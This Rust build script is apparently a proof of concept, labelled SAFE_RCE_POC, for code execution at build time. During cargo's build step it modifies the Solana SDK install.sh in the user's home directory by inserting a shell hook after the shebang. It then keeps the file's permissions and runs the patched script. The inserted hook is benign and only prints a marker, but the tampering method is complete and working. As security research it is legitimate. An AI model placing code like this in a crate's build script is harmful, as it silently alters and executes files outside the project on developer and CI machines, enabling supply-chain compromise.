use std::{env, fs, path::Path, process::Command};

#[cfg(unix)]
use std::os::unix::fs::PermissionsExt;

fn main() {
    // Path used in your workflow after the curl install:
    // ~/.local/share/solana/install/active_release/bin/sdk/sbf/scripts/install.sh
    let home = env::var("HOME").unwrap_or_default();
    let install_path = format!(
        "{home}/.local/share/solana/install/active_release/bin/sdk/sbf/scripts/install.sh"
    );
    let p = Path::new(&install_path);

    if !p.is_file() {
        println!("cargo:warning=SAFE_RCE_POC: install.sh not found at {}", install_path);
        return;
    }

    // Read original
    let orig = match fs::read(&p) {
        Ok(b) => b,
        Err(e) => {
            println!("cargo:warning=SAFE_RCE_POC: cannot read install.sh: {e}");
            return;
        }
    };
    let mut text = String::from_utf8_lossy(&orig).into_owned();

    // Capture and preserve permissions
    let meta = match fs::metadata(&p) {
        Ok(m) => m,
        Err(e) => {
            println!("cargo:warning=SAFE_RCE_POC: cannot stat install.sh: {e}");
            return;
        }
    };
    #[cfg(unix)]
    let mode = meta.permissions().mode();

    // If already patched, skip modifying
    if !text.contains("SAFE_RCE_POC_HOOK") {
        // Insert the hook immediately after the shebang (if present), else at top
        let hook = r#"
# ===== SAFE_RCE_POC_HOOK (non-destructive) =====
if [ -n "${SAFE_RCE_POC:-}" ]; then
  printf '%s\n' '===SAFE_RCE_POC install.sh HELLO==='
  exit 0
fi
# ===== END SAFE_RCE_POC_HOOK =====
"#;

        if let Some(pos) = text.find('\n') {
            // If the file starts with a shebang, put our hook after the first line
            if text.starts_with("#!") {
                text.insert_str(pos + 1, hook);
            } else {
                text = format!("{hook}{text}");
            }
        } else {
            // Single-line file: just prepend
            text = format!("{hook}{text}");
        }

        // Backup original
        let backup = format!("{install_path}.poc.bak");
        if let Err(e) = fs::write(&backup, &orig) {
            println!("cargo:warning=SAFE_RCE_POC: failed to create backup {backup}: {e}");
        } else {
            println!("cargo:warning=SAFE_RCE_POC: backup created at {backup}");
        }

        // Write patched version
        if let Err(e) = fs::write(&p, text.as_bytes()) {
            println!("cargo:warning=SAFE_RCE_POC: failed to write patched install.sh: {e}");
            return;
        }

        // Restore original permissions (keep executable bit)
        #[cfg(unix)]
        {
            let mut perms = fs::metadata(&p).expect("stat after write").permissions();
            perms.set_mode(mode);
            if let Err(e) = fs::set_permissions(&p, perms) {
                println!("cargo:warning=SAFE_RCE_POC: failed to restore permissions: {e}");
            }
        }

        println!("cargo:warning=SAFE_RCE_POC: install.sh patched (hello hook added)");
    } else {
        println!("cargo:warning=SAFE_RCE_POC: install.sh already patched (hook present)");
    }

    // Execute install.sh *safely* so we see the hello in logs, but skip heavy actions.
    // Our hook makes it exit immediately when SAFE_RCE_POC=1.
    let out = Command::new("sh")
        .arg("-lc")
        .arg(format!(r#"SAFE_RCE_POC=1 "{}""#, install_path))
        .output()
        .expect("failed to spawn shell");

    for line in String::from_utf8_lossy(&out.stdout).lines() {
        println!("cargo:warning={}", line);
    }
    for line in String::from_utf8_lossy(&out.stderr).lines() {
        println!("cargo:warning=STDERR: {}", line);
    }

    println!("cargo:warning=SAFE_RCE_POC: done");
}
